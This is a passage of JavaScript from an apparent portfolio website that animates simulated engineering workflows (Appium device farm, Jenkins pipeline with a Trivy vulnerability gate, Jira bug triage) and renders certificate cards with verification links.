      appendLog('<span class="term-err">[!] CRITICAL ElementNotInteractableException: #login not clickable</span>');
      appendLog('<span class="term-warn">[*] root cause: Angular renders #login ~600ms AFTER click()</span>');
      appendLog('<span class="term-ok">[ok] fix: replaced implicit wait with explicit WebDriverWait until elementToBeClickable</span>');
      appendLog('<span class="term-ok">[ok] workflow complete — flaky test fixed, 50/50 → 50/50 pass rate stabilised');
    }, 2900);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 6. Appium (Intermediate) — iOS + Android parallel test farm ---------- */
function buildAppiumSim(skill, meta, lvl) {
  const slug = 'appium';
  const visual = `
    <div class="ap-farm" id="ap-farm-${slug}">
      <div class="ap-device" data-i="0">
        <span class="ap-ico">📱</span>
        <span class="ap-name">iPhone 15</span>
        <span class="ap-os">iOS 17.4</span>
        <span class="ap-test">LoginTest</span>
        <span class="ap-state" id="ap-state-0-${slug}">IDLE</span>
      </div>
      <div class="ap-device" data-i="1">
        <span class="ap-ico">📱</span>
        <span class="ap-name">iPhone 14</span>
        <span class="ap-os">iOS 16.7</span>
        <span class="ap-test">LoginTest</span>
        <span class="ap-state" id="ap-state-1-${slug}">IDLE</span>
      </div>
      <div class="ap-device" data-i="2">
        <span class="ap-ico">📱</span>
        <span class="ap-name">Galaxy S22</span>
        <span class="ap-os">Android 14</span>
        <span class="ap-test">CartTest</span>
        <span class="ap-state" id="ap-state-2-${slug}">IDLE</span>
      </div>
      <div class="ap-device" data-i="3">
        <span class="ap-ico">📱</span>
        <span class="ap-name">Pixel 7</span>
        <span class="ap-os">Android 14</span>
        <span class="ap-test">CartTest</span>
        <span class="ap-state" id="ap-state-3-${slug}">IDLE</span>
      </div>
    </div>
    <div class="script-exec" style="margin-top:8px">
      <div class="sim-h">// appium grid — parallel run + capability setup</div>
      <div class="term" id="ap-log-${slug}" style="min-height:160px"></div>
    </div>`;

  const lines = [
    `$ # appium — daily workflow @ ${ts()}`,
    '$ appium --nodeconfig nodes/iphone15.json  &',
    '$ appium --nodeconfig nodes/iphone14.json  &',
    '$ appium --nodeconfig nodes/galaxy-s22.json &',
    '$ appium --nodeconfig nodes/pixel-7.json   &',
    '[ok] 4 nodes registered to grid',
    '$ mvn -Dtest=LoginTest,CartTest -Dparallel=classes test',
    '[*] LoginTest running on iPhone 15 + iPhone 14 (parallel)',
    '[!] iPhone 14: element @name="loginBtn" not found — actual @name="sign-in-btn"',
    '[ok] iPhone 15: LoginTest PASSED in 12.4s',
    '[!] iPhone 14: LoginTest FAILED — capability/selector mismatch on iOS 16.7',
    '[ok] Galaxy S22 + Pixel 7: CartTest PASSED in 14.1s',
    '$ # triaged → AXA-1248 (iOS element selector mismatch across versions)',
    '$ # workflow complete — test made version-aware via @Platform annotation'
  ];

  function animate(host, timers) {
    const farm = host.querySelector(`#ap-farm-${slug}`);
    const log = host.querySelector(`#ap-log-${slug}`);
    if (!farm || !log) return;
    log.innerHTML = '';
    const states = [];
    for (let i = 0; i < 4; i++) {
      const s = host.querySelector(`#ap-state-${i}-${slug}`);
      if (s) { s.textContent = 'IDLE'; s.className = 'ap-state idle'; }
      states.push(s);
    }

    function setTile(i, txt, cls) {
      const s = states[i];
      if (!s) return;
      s.textContent = txt;
      s.className = 'ap-state ' + cls;
    }

    function appendLog(html) {
      const d = document.createElement('div');
      d.className = 'term-line';
      d.innerHTML = html;
      log.appendChild(d);
      log.scrollTop = log.scrollHeight;
    }

    // Phase 1: capability setup (per-device iOS/Android caps shown)
    timers.later(() => {
      appendLog('<span class="term-out">$ appium --nodeconfig nodes/iphone15.json  &</span>');
      appendLog('<span class="term-out">$ appium --nodeconfig nodes/iphone14.json  &</span>');
      appendLog('<span class="term-out">$ appium --nodeconfig nodes/galaxy-s22.json &</span>');
      appendLog('<span class="term-out">$ appium --nodeconfig nodes/pixel-7.json   &</span>');
    }, 200);
    timers.later(() => {
      appendLog('<span class="term-ok">[ok] 4 nodes registered to grid (2 iOS + 2 Android)</span>');
      appendLog('<span class="term-out">  iOS  cap.setCapability("platformName", "iOS")</span>');
      appendLog('<span class="term-out">  iOS  cap.setCapability("automationName", "XCUITest")</span>');
      appendLog('<span class="term-out">  AND  cap.setCapability("platformName", "Android")</span>');
      appendLog('<span class="term-out">  AND  cap.setCapability("automationName", "UiAutomator2")</span>');
      appendLog('<span class="term-out">$ mvn -Dtest=LoginTest,CartTest -Dparallel=classes test</span>');
    }, 900);

    // Phase 2: both iOS tiles turn RUNNING (LoginTest parallel)
    timers.later(() => {
      appendLog('<span class="term-out">[*] LoginTest starting on iPhone 15 + iPhone 14 (parallel)</span>');
      setTile(0, 'RUNNING', 'running');
      setTile(1, 'RUNNING', 'running');
    }, 1500);

    // Phase 3: iPhone 14 selector mismatch flagged (iOS 16.7 has different button name)
    timers.later(() => {
      appendLog('<span class="term-err">[!] iPhone 14: element @name="loginBtn" not found</span>');
      appendLog('<span class="term-err">    actual @name="sign-in-btn" (iOS 16.7 build target)</span>');
      setTile(1, 'MISMATCH', 'warn');
    }, 2200);

    // Phase 4: iPhone 15 passes; iPhone 14 fails
    timers.later(() => {
      appendLog('<span class="term-ok">[ok] iPhone 15: LoginTest PASSED in 12.4s</span>');
      setTile(0, 'PASS', 'pass');
    }, 2900);
    timers.later(() => {
      appendLog('<span class="term-err">[!] iPhone 14: LoginTest FAILED — capability/selector mismatch on iOS 16.7</span>');
      setTile(1, 'FAIL', 'fail');
    }, 3500);

    // Phase 5: Android tiles start CartTest in parallel — both pass
    timers.later(() => {
      appendLog('<span class="term-out">[*] CartTest starting on Galaxy S22 + Pixel 7 (parallel)</span>');
      setTile(2, 'RUNNING', 'running');
      setTile(3, 'RUNNING', 'running');
    }, 4200);
    timers.later(() => {
      appendLog('<span class="term-ok">[ok] Galaxy S22: CartTest PASSED in 14.1s</span>');
      appendLog('<span class="term-ok">[ok] Pixel 7:    CartTest PASSED in 14.1s</span>');
      setTile(2, 'PASS', 'pass');
      setTile(3, 'PASS', 'pass');
    }, 5100);

    // Phase 6: triage summary
    timers.later(() => {
      appendLog('<span class="term-warn">[!] triaged → AXA-1248 (iOS element selector mismatch across versions)</span>');
      appendLog('<span class="term-ok">[ok] fix: split LoginTest into LoginTestIOS16/17 with @Platform-specific selectors</span>');
      appendLog('<span class="term-ok">[ok] workflow complete — test suite made version-aware');
    }, 5800);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 7. CI/CD (Jenkins) (Intermediate) — pipeline w/ Trivy scan gate ---------- */
function buildCICDJenkinsSim(skill, meta, lvl) {
  const slug = 'ci-cd-jenkins';
  const visual = `
    <div class="pipeline-flow" id="ci-flow-${slug}" style="margin-bottom:8px">
      <div class="pl-step pending" data-i="0"><span class="pl-no">01</span><span class="pl-name">Checkout</span><span class="pl-state">QUEUED</span></div>
      <div class="pl-arrow">→</div>
      <div class="pl-step pending" data-i="1"><span class="pl-no">02</span><span class="pl-name">Build</span><span class="pl-state">QUEUED</span></div>
      <div class="pl-arrow">→</div>
      <div class="pl-step pending" data-i="2"><span class="pl-no">03</span><span class="pl-name">Unit Test</span><span class="pl-state">QUEUED</span></div>
      <div class="pl-arrow">→</div>
      <div class="pl-step pending" data-i="3"><span class="pl-no">04</span><span class="pl-name">Trivy Scan</span><span class="pl-state">QUEUED</span></div>
      <div class="pl-arrow">→</div>
      <div class="pl-step pending" data-i="4"><span class="pl-no">05</span><span class="pl-name">Deploy</span><span class="pl-state">QUEUED</span></div>
    </div>
    <div class="script-grid">
      <div class="script-editor">
        <div class="sim-h">// Jenkinsfile (declarative) — build #47</div>
        <pre class="code-viewer" id="ci-jenkinsfile-${slug}" style="max-height:220px;white-space:pre-wrap;margin:0;overflow:auto"></pre>
      </div>
      <div class="script-exec">
        <div class="sim-h">// build #47 — console output</div>
        <div class="term" id="ci-log-${slug}" style="min-height:220px"></div>
      </div>
    </div>`;

  const jenkinsfileLines = [
    'pipeline {',
    '    agent any',
    '',
    '    options {',
    "        buildDiscarder(logRotator(numToKeepStr: '20'))",
    "        timeout(time: 30, unit: 'MINUTES')",
    '    }',
    '',
    '    stages {',
    "        stage('Checkout') {",
    "            steps { git 'https://github.com/acme/app.git' }",
    '        }',
    "        stage('Build') {",
    "            steps { sh 'mvn -B -DskipTests package' }",
    '        }',
    "        stage('Unit Test') {",
    "            steps { sh 'mvn test' }",
    '        }',
    "        stage('Trivy Scan') {",
    "            steps { sh 'trivy image --severity HIGH,CRITICAL app:latest' }",
    '        }',
    "        stage('Deploy') {",
    "            steps { sh 'kubectl apply -f k8s/prod.yaml' }",
    '        }',
    '    }',
    '}'
  ];

  const lines = [
    `$ # jenkins pipeline — daily workflow @ ${ts()}`,
    '$ git push origin main → triggered build #47',
    '[ok] Checkout   — commit 4f8c2e1 (Souhaieb <souhaieb@acme>)',
    '[ok] Build      — target/app.war 18.4 MB',
    '[ok] Unit Test  — 184 tests passed in 7.4s',
    '[!] Trivy Scan  — 2 HIGH CVEs in libssl-1.1.1k',
    '[!]   - CVE-2021-3711  HIGH  openssl 1.1.1k',
    '[!]   - CVE-2021-3712  HIGH  openssl 1.1.1k',
    '[!] Deploy      — BLOCKED by scan gate',
    '$ # pipeline FAILED in 3m 12s — bump openssl → 3.0.14',
    '$ # workflow complete — patch PR opened, build #48 queued'
  ];

  function highlight(line) {
    let s = escapeHtmlS(line);
    s = s.replace(/('[^']*')/g, '<span class="s">$1</span>');
    s = s.replace(/\b(pipeline|stages|stage|steps|sh|git|options|agent|any|return)\b/g, '<span class="k">$1</span>');
    return s;
  }

  function animate(host, timers) {
    const flow = host.querySelector(`#ci-flow-${slug}`);
    const jf = host.querySelector(`#ci-jenkinsfile-${slug}`);
    const log = host.querySelector(`#ci-log-${slug}`);
    if (!flow || !jf || !log) return;
    jf.innerHTML = '';
    log.innerHTML = '';
    const steps = flow.querySelectorAll('.pl-step');
    steps.forEach((s) => {
      s.classList.remove('running', 'done', 'warn', 'fail');
      s.classList.add('pending');
      s.querySelector('.pl-state').textContent = 'QUEUED';
    });

    function appendLog(html, cls) {
      const d = document.createElement('div');
      d.className = 'term-line';
      d.innerHTML = `<span class="${cls || 'term-out'}">${html}</span>`;
      log.appendChild(d);
      log.scrollTop = log.scrollHeight;
    }

    function setStep(i, cls, label) {
      const s = steps[i];
      if (!s) return;
      s.classList.remove('pending', 'running', 'done', 'warn', 'fail');
      s.classList.add(cls);
      s.querySelector('.pl-state').textContent = label;
    }

    // Phase 1: type Jenkinsfile
    let ji = 0;
    timers.every(() => {
      if (ji >= jenkinsfileLines.length) return;
      const ln = jenkinsfileLines[ji++];
      const d = document.createElement('div');
      d.innerHTML = ln === '' ? '&nbsp;' : highlight(ln);
      jf.appendChild(d);
      jf.scrollTop = jf.scrollHeight;
    }, 40);

    // Phase 2: run stages sequentially — Trivy Scan fails → Deploy blocked
    const codeDoneAt = jenkinsfileLines.length * 40 + 200;
    timers.later(() => appendLog('<strong style="color:var(--neon-2)">[Build #47]</strong> Started by user souhaieb@acme'), codeDoneAt);

    // stage 0: Checkout
    timers.later(() => { setStep(0, 'running', 'RUNNING'); appendLog('[*] Checkout — git fetch origin main', 'term-out'); }, codeDoneAt + 400);
    timers.later(() => { setStep(0, 'done', 'PASS'); appendLog('[ok] Checkout — commit 4f8c2e1', 'term-ok'); }, codeDoneAt + 1100);

    // stage 1: Build
    timers.later(() => { setStep(1, 'running', 'RUNNING'); appendLog('[*] Build — mvn -B -DskipTests package', 'term-out'); }, codeDoneAt + 1500);
    timers.later(() => { setStep(1, 'done', 'PASS'); appendLog('[ok] Build — target/app.war 18.4 MB', 'term-ok'); }, codeDoneAt + 2400);

    // stage 2: Unit Test
    timers.later(() => { setStep(2, 'running', 'RUNNING'); appendLog('[*] Unit Test — mvn test', 'term-out'); }, codeDoneAt + 2800);
    timers.later(() => { setStep(2, 'done', 'PASS'); appendLog('[ok] Unit Test — 184 tests passed in 7.4s', 'term-ok'); }, codeDoneAt + 3700);

    // stage 3: Trivy Scan — FAIL
    timers.later(() => { setStep(3, 'running', 'RUNNING'); appendLog('[*] Trivy Scan — trivy image --severity HIGH,CRITICAL app:latest', 'term-out'); }, codeDoneAt + 4100);
    timers.later(() => {
      appendLog('[!] Trivy Scan — 2 HIGH CVEs in libssl-1.1.1k', 'term-err');
      appendLog('    - CVE-2021-3711  HIGH  openssl 1.1.1k  (SMTP SMIME decryption)', 'term-err');
      appendLog('    - CVE-2021-3712  HIGH  openssl 1.1.1k  (X.509 Read OOB)', 'term-err');
      setStep(3, 'fail', 'FAIL');
    }, codeDoneAt + 5400);

    // stage 4: Deploy — blocked
    timers.later(() => {
      setStep(4, 'warn', 'BLOCKED');
      appendLog('[!] Deploy — BLOCKED by scan gate (fail-fast on HIGH CVEs)', 'term-err');
      appendLog('[!] pipeline FAILED in 3m 12s', 'term-err');
      appendLog('[ok] remediation — bump openssl 1.1.1k → 3.0.14, open PR #1189', 'term-ok');
      appendLog('[ok] workflow complete — build #48 queued, deploy deferred', 'term-ok');
    }, codeDoneAt + 6200);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 8. Jira (Advanced) — critical ticket triage + mentoring thread ---------- */
function buildJiraSim(skill, meta, lvl) {
  const slug = 'jira';
  const visual = `
    <div class="jr-ticket" id="jr-ticket-${slug}">
      <div class="jr-header">
        <span class="jr-key">KDG-2018-0917</span>
        <span class="jr-prio">CRITICAL</span>
        <span class="jr-p1">P1</span>
        <span class="jr-sla" id="jr-sla-${slug}">SLA: 04h 00m remaining</span>
      </div>
      <div class="jr-summary">Boot loop on factory reset — firmware 5.4.3</div>
      <div class="jr-body">
        <div class="jr-field"><span class="jr-key2">Affected Version</span><span class="jr-val">5.4.3</span></div>
        <div class="jr-field"><span class="jr-key2">Assignee</span><span class="jr-val">Souhaieb Marzouk</span></div>
        <div class="jr-field"><span class="jr-key2">Reporter</span><span class="jr-val">noc@acme (NOC shift)</span></div>
        <div class="jr-field"><span class="jr-key2">Component</span><span class="jr-val">firmware-bootloader</span></div>
      </div>
      <div class="jr-desc">
        <div class="sim-h">// description</div>
        <p>On factory reset, KDG gateway enters a boot loop. Power LED blinks red 3x then restarts. Issue reproduces on 100% of 5.4.3 devices; did not occur on 5.4.2.</p>
      </div>
      <div class="jr-steps">
        <div class="sim-h">// steps to reproduce</div>
        <ol id="jr-steps-${slug}">
          <li>Flash firmware 5.4.3 onto KDG gateway</li>
          <li>Wait for device to come up (boot takes ~45s)</li>
          <li>Press &amp; hold reset pin for 12s until LED turns red</li>
          <li>Release reset pin</li>
          <li>Observe: LED blinks red 3x, then device reboots</li>
          <li>Loop repeats indefinitely until power-cycle</li>
        </ol>
      </div>
      <div class="jr-statusflow" id="jr-flow-${slug}">
        <span class="jr-state active" data-i="0">OPEN</span>
        <span class="jr-arrow">→</span>
        <span class="jr-state pending" data-i="1">IN PROGRESS</span>
        <span class="jr-arrow">→</span>
        <span class="jr-state pending" data-i="2">IN REVIEW</span>
        <span class="jr-arrow">→</span>
        <span class="jr-state pending" data-i="3">RESOLVED</span>
        <span class="jr-arrow">→</span>
        <span class="jr-state pending" data-i="4">VERIFIED</span>
      </div>
      <div class="jr-comments" id="jr-comments-${slug}">
        <div class="sim-h">// comments — mentoring thread (2 engineers)</div>
      </div>
    </div>`;

  // Advanced level — multi-step investigation, mentors others, produces remediation proposal
  const intro = `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-3)">Advanced</strong> level — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.
    Analyst runs a multi-step investigation, mentors two engineers through the fix, and produces a remediation proposal merged into the next release candidate.`;

  const comments = [
    { author: 'souhaieb', role: 'Sr. Firmware Engineer', time: '09:14', msg: 'Root-caused: <code>/lib/firmware/reset_probe.c:147</code> — the <code>reset_confirm</code> flag defaults to 0 on 5.4.3 squashfs (should be 1). Causes probe to exit early during reset, leaving the watchdog armed.' },
    { author: 'amartin',   role: 'Engineer (mentee)',    time: '09:31', msg: 'Confirmed on my dev device (5.4.3) — dmesg shows <code>reset_probe: confirm=0, aborting</code> just before each loop. Sending full dmesg + serial console logs.' },
    { author: 'bkhoury',   role: 'Engineer (mentee)',    time: '09:48', msg: 'Is the issue in the new <code>reset_confirm</code> flag that landed in 5.4.3? git blame shows it was added in commit a3f1b2c.' },
    { author: 'souhaieb', role: 'Sr. Firmware Engineer', time: '10:02', msg: '@amartin @bkhoury exactly right. The flag is initialized to 0 instead of 1. Hopping on a call in 5min to walk you both through the fix — <code>reset_probe.c:147</code> needs <code>flag = 1</code> as the default, not 0.' },
    { author: 'amartin',   role: 'Engineer (mentee)',    time: '10:34', msg: 'Opened PR #1184 — corrected flag default + added a unit test <code>test_reset_confirm_defaults_to_one</code>. Assigned to @souhaieb for review.' },
    { author: 'bkhoury',   role: 'Engineer (mentee)',    time: '10:51', msg: 'Added regression test <code>test_boot_loop_factory_reset()</code> to PR #1184 — verified locally on 2 devices, 50 reset cycles, no loop.' },
    { author: 'souhaieb', role: 'Sr. Firmware Engineer', time: '11:09', msg: 'PR #1184 LGTM, merged. Image <code>5.4.4-rc1</code> building in CI (#48). @qa please verify on 3 devices before we close this P1.' },
    { author: 'qa-bot',    role: 'QA Automation',          time: '11:47', msg: 'VERIFIED on 3/3 devices (iPhone-15-farm, Galaxy-S22, Pixel-7). 50 factory-reset cycles each, no boot loop observed. Ticket can be closed.' }
  ];

  // status transitions tied to comment indices
  //   c0 → OPEN (initial) — c1 (09:31) → IN PROGRESS — c3 (10:02) → IN REVIEW
  //   c6 (11:09) → RESOLVED — c7 (11:47) → VERIFIED
  const transitions = [
    { afterComment: 0, toState: 1, label: 'IN PROGRESS' }, // after 1st comment (souhaieb starts work)
    { afterComment: 2, toState: 2, label: 'IN REVIEW' },   // after @bkhoury asks about flag — moved to review
    { afterComment: 5, toState: 3, label: 'RESOLVED' },    // after PR merged
    { afterComment: 6, toState: 4, label: 'VERIFIED' }     // after qa-bot verifies — wait that's c7
  ];
  // fix index — qa-bot is c7 (index 7) but qa-bot triggers VERIFIED. let me re-check
  // comments array indices: 0..7 (8 comments). qa-bot is index 7.
  // transitions: c0 → IN PROGRESS (afterComment=0 means after first comment)
  //              c2 → IN REVIEW   (afterComment=2)
  //              c6 → RESOLVED    (afterComment=6)
  //              c7 → VERIFIED    (afterComment=7)
  const txList = [
    { afterComment: 0, toState: 1, label: 'IN PROGRESS' },
    { afterComment: 2, toState: 2, label: 'IN REVIEW' },
    { afterComment: 6, toState: 3, label: 'RESOLVED' },
    { afterComment: 7, toState: 4, label: 'VERIFIED' }
  ];

  const lines = [
    `$ # jira — advanced investigation @ ${ts()}`,
    '$ # multi-step investigation — produces a remediation proposal',
    '$ curl -u souhaieb:$TOKEN /rest/api/2/issue/KDG-2018-0917',
    '[ok] KDG-2018-0917 CRITICAL P1 — boot loop on factory reset',
    '[*] correlating: 47 duplicate tickets across 5.4.3, 0 in 5.4.2',
    '[!] root cause: /lib/firmware/reset_probe.c:147 — reset_confirm flag defaults to 0',
    '[ok] remediation proposal:',
    '[ok]   - PR #1184: correct flag default in reset_probe.c',
    '[ok]   - add regression test test_boot_loop_factory_reset()',
    '[ok]   - backport to 5.4.x LTS, ship in 5.4.4-rc1',
    '$ # mentoring: walked 2 engineers (amartin, bkhoury) through the fix',
    '$ # workflow complete — VERIFIED on 3/3 devices, ticket closed'
  ];

  function animate(host, timers) {
    const slaEl = host.querySelector(`#jr-sla-${slug}`);
    const flowEl = host.querySelector(`#jr-flow-${slug}`);
    const commentsEl = host.querySelector(`#jr-comments-${slug}`);
    if (!flowEl || !commentsEl) return;
    commentsEl.innerHTML = '<div class="sim-h">// comments — mentoring thread (2 engineers)</div>';
    const stateEls = flowEl.querySelectorAll('.jr-state');
    stateEls.forEach((s, i) => {
      s.classList.remove('done', 'active');
      s.classList.add(i === 0 ? 'active' : 'pending');
    });
    if (slaEl) slaEl.textContent = 'SLA: 04h 00m remaining';

    // SLA ticking: 4h 00m → ~1h 12m over 12 ticks (each tick = 13 simulated minutes)
    let slaMins = 240; // start 4h
    timers.every(() => {
      slaMins = Math.max(0, slaMins - 13);
      const hh = Math.floor(slaMins / 60);
      const mm = String(slaMins % 60).padStart(2, '0');
      if (slaEl) {
        const within = slaMins > 0;
        slaEl.textContent = within ? `SLA: ${String(hh).padStart(2, '0')}h ${mm}m remaining` : 'SLA: resolved with buffer';
        slaEl.style.color = slaMins < 30 ? 'var(--neon-3)' : 'var(--neon-2)';
      }
    }, 1500);

    function setState(toState) {
      stateEls.forEach((s, i) => {
        s.classList.remove('active', 'pending', 'done');
        if (i < toState) s.classList.add('done');
        else if (i === toState) s.classList.add('active');
        else s.classList.add('pending');
      });
    }

    // stream comments one at a time, ~2.2s apart
    let ci = 0;
    timers.later(() => {
      timers.every(() => {
        if (ci >= comments.length) return;
        const c = comments[ci];
        const d = document.createElement('div');
        d.className = 'jr-comment';
        const isMentor = c.role.includes('Sr.');
        d.innerHTML = `
          <div class="jr-author">${escapeHtmlS(c.author)} <span class="jr-role${isMentor ? ' mentor' : ''}">${escapeHtmlS(c.role)}</span></div>
          <div class="jr-time">${escapeHtmlS(c.time)}</div>
          <div class="jr-msg">${c.msg}</div>`;
        commentsEl.appendChild(d);
        commentsEl.scrollTop = commentsEl.scrollHeight;

        // check transitions after this comment
        const tx = txList.find((t) => t.afterComment === ci);
        if (tx) setState(tx.toState);

        ci++;
      }, 2200);
    }, 400);
  }

  return { intro, visual, lines, animate };
}

/* ============================================================
 *  BATCH H — Builder map (keys match SKILL_META names exactly)
 * ============================================================ */
const BATCH_H_BUILDERS = {
  'Python':          buildPythonSim,
  'PowerShell':      buildPowerShellSim,
  'Bash':            buildBashSim,
  'Java':            buildJavaSim,
  'Selenium':        buildSeleniumSim,
  'Appium':          buildAppiumSim,
  'CI/CD (Jenkins)': buildCICDJenkinsSim,
  'Jira':            buildJiraSim
};

  /* ---------- Per-skill bespoke dispatcher ---------- */
  const SKILL_SIM_BUILDERS = Object.assign({},
    BATCH_A_BUILDERS, BATCH_B_BUILDERS, BATCH_C_BUILDERS, BATCH_D_BUILDERS,
    BATCH_E_BUILDERS, BATCH_F_BUILDERS, BATCH_G_BUILDERS, BATCH_H_BUILDERS
  );

  /* ---------- Master visual Live Simulation (per-skill bespoke) ---------- */
  function genericLiveSim(skill, host) {
    const lvl = (skill.level || '').toLowerCase();
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    const name = skill.name;
    const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
    const meta = SKILL_META[name] || { cat: 'generic', icon: '⚡', role: 'Engineer', scene: 'Operate ' + name, tool: name, ioc: 'no specific IOC' };

    // 1) Per-skill bespoke builder (the new code path — every skill has its own)
    const builder = SKILL_SIM_BUILDERS[name];
    let content = null;
    if (builder) {
      try { content = builder(skill, meta, lvl); } catch (e) { content = null; /* fall back below */ }
    }
    // 2) Fallback to old category template if a per-skill builder is missing OR threw
    if (!content) {
      const template = SKILL_TEMPLATES[meta.cat] || SKILL_TEMPLATES.generic;
      try { content = template(skill, meta, lvl); } catch (e) {
        content = { intro: `Simulation for ${escapeHtmlS(name)}.`, visual: '', lines: [`$ # ${name}`], animate: function(){} };
      }
    }

    host.innerHTML = `
      <div class="sim-h">${escapeHtmlS(name).toUpperCase()} — LIVE SIMULATION (${cap.toUpperCase()})</div>
      <div class="sim-p">${content.intro}</div>
      ${content.visual || ''}
      <div class="term" id="vis-term-${slug}" style="margin-top:10px"></div>
      <div class="sim-p" style="margin-top:14px;font-size:11px;color:var(--fg-dim);line-height:1.6">
        <strong style="color:var(--neon-2)">Level calibration:</strong> ${levelDescriptor(lvl)}
      </div>
    `;

    const timers = makeTimers(host);
    if (content.animate) {
      try { content.animate(host, timers); } catch (e) { /* swallow anim errors */ }
    }
    attachTerminal($('#vis-term-' + slug, host), content.lines, { speed: 14, linePause: 110 });
  }

  // =========================================================================
  //  CERT VIEW — shown when a cert card is clicked.
  //  Displays: full cert picture + description + issuer/date + VERIFY button
  //  VERIFY button is the ONLY external navigation.
  // =========================================================================
  function certViewSim(cert, host) {
    const issuerLogo = issuerLogoForCert(cert);
    const issuerC = issuerCertif(cert);
    host.innerHTML = `
      <div class="cert-view-grid">
        <div class="cert-view-image-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">certificate_image</span>
            <span class="skill-modal-lvl" style="border-color:var(--neon-3);color:var(--neon-3)">VERIFIED</span>
          </div>
          <div class="cert-image-frame">
            <img src="${issuerC}" alt="${escapeHtmlS(cert.title)} certificate image" loading="lazy" onerror="this.onerror=null;this.src='${fb(CERT_FALLBACK, issuerC, 'assets/certificates/google-cybersecurity.svg')}'" />
            <div class="cert-image-corner ctc-tl"></div>
            <div class="cert-image-corner ctc-tr"></div>
            <div class="cert-image-corner ctc-bl"></div>
            <div class="cert-image-corner ctc-br"></div>
          </div>
        </div>
        <div class="cert-view-info-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">${escapeHtmlS(cert.title)}</span>
          </div>
          <div class="cert-view-issuer-row">
            <img src="${issuerLogo}" alt="${escapeHtmlS(cert.issuer)} logo" class="cert-view-issuer-logo" loading="lazy" onerror="this.onerror=null;this.src='${fb(LOGO_FALLBACK, issuerLogo, 'assets/issuer-logos/google.svg')}'" />
            <div>
              <div class="cv-issuer-name">${escapeHtmlS(cert.issuer)}</div>
              <div class="cv-issue-date">Issued: ${escapeHtmlS(cert.date)}</div>
            </div>
          </div>
          <div class="cert-view-desc">
            <div class="cvd-label">// DESCRIPTION</div>
            <p class="cvd-text">${escapeHtmlS(cert.blurb || 'No description available for this certification.')}</p>
          </div>
          <div class="cert-view-meta">
            <div class="cvm-row">
              <span class="cvm-key">RECIPIENT</span>
              <span class="cvm-val">Souhaieb Marzouk</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">ISSUE_DATE</span>
              <span class="cvm-val">${escapeHtmlS(cert.date)}</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">ISSUING_BODY</span>
              <span class="cvm-val">${escapeHtmlS(cert.issuer)}</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">VERIFY_URL</span>
              <span class="cvm-val" style="word-break:break-all;font-size:10px">${escapeHtmlS(cert.verifyUrl || '—')}</span>
            </div>
          </div>
          <a class="cert-view-verify-btn" href="${escapeHtmlS(cert.verifyUrl || '#')}" target="_blank" rel="noopener noreferrer">
            <span>VERIFY_CERTIFICATE</span>
            <span class="arrow">↗</span>
          </a>
          <div class="sim-p" style="margin-top:10px;font-size:10px;color:var(--fg-dim);line-height:1.5">
            // External verification link opens in a new tab.
          </div>
        </div>
      </div>
    `;
  }

  /* SVG fallbacks (used automatically when local PNG/JPG assets are absent) */
  const LOGO_FALLBACK = {
    'assets/issuer-logos/HTB-Logo.png':     'assets/issuer-logos/htb.svg',
    'assets/issuer-logos/Comptia-Logo.png': 'assets/issuer-logos/comptia.svg',
    'assets/issuer-logos/THM-Logo.jpg':     'assets/issuer-logos/tryhackme.svg',
    'assets/issuer-logos/Google-Logo.png':  'assets/issuer-logos/google.svg',
    'assets/issuer-logos/ATSQA-Logo.jpeg':  'assets/issuer-logos/atsqa.svg'
  };
  const CERT_FALLBACK = {
    'assets/certificates/HTB-CDSA.png':            'assets/certificates/htb-cdsa.svg',
    'assets/certificates/Network+.png':            'assets/certificates/comptia-network-plus.svg',
    'assets/certificates/Security+.png':           'assets/certificates/comptia-security-plus.svg',
    'assets/certificates/Cyber-Security-101.png':  'assets/certificates/thm-cyber-101.svg',
    'assets/certificates/Jr-PenTester.png':        'assets/certificates/thm-jr-pentester.svg',
    'assets/certificates/SOC-L1.png':              'assets/certificates/thm-soc-l1.svg',
    'assets/certificates/SOC-L2.png':              'assets/certificates/thm-soc-l2.svg',
    'assets/certificates/Google-Cybersecurity.png':'assets/certificates/google-cybersecurity.svg',
    'assets/certificates/CTFL.png':                'assets/certificates/istqb-ctfl.svg',
    'assets/certificates/CTFL-AT.png':             'assets/certificates/istqb-ctfl-at.svg'
  };
  function fb(map, src, dflt) { return map[src] || dflt; }

  function issuerLogoForCert(cert) {
    const m = {
      htb:       'assets/issuer-logos/HTB-Logo.png',
      comptia:   'assets/issuer-logos/Comptia-Logo.png',
      tryhackme: 'assets/issuer-logos/THM-Logo.jpg',
      google:    'assets/issuer-logos/Google-Logo.png',
      atsqa:     'assets/issuer-logos/ATSQA-Logo.jpeg'
    };
    if (cert.issuerKey && m[cert.issuerKey]) return m[cert.issuerKey];
    const byName = {
      'HackTheBox':       'assets/issuer-logos/HTB-Logo.png',
      'CompTIA':          'assets/issuer-logos/Comptia-Logo.png',
      'TryHackMe':        'assets/issuer-logos/THM-Logo.jpg',
      'Google / Coursera':'assets/issuer-logos/Google-Logo.png',
      'AT*SQA':           'assets/issuer-logos/ATSQA-Logo.jpeg'
    };
    return byName[cert.issuer] || 'assets/issuer-logos/Google-Logo.png';
  }
  function issuerCertif(cert) {
    const m = {
      htb:       'assets/certificates/HTB-CDSA.png',
      compnet:   'assets/certificates/Network+.png',
      compsec:   'assets/certificates/Security+.png',
      thm101: 'assets/certificates/Cyber-Security-101.png',
      thmjrpentest: 'assets/certificates/Jr-PenTester.png',
      thmsocl1: 'assets/certificates/SOC-L1.png',
      thmsocl2: 'assets/certificates/SOC-L2.png',
      google:    'assets/certificates/Google-Cybersecurity.png',
      ctfl:     'assets/certificates/CTFL.png',
      ctflat:     'assets/certificates/CTFL-AT.png'
    };
    if (cert.issuerKey && m[cert.issuerKey]) return m[cert.issuerKey];
    const byName = {
